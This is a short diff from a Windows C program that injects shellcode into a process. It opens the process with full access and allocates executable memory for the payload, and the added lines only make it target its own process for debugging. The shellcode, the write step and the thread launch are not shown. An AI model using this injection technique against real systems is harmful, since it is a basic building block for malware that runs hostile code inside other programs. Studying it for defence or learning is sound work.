@@ -59,6 +59,9 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
+    // For debug: inject into myself
+    pid = GetCurrentProcessId();
+
     // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
     processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);                                                            // Open the process with enough permission to create a remote thread
     remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); // Allocate enough space in the new process for our shellcode
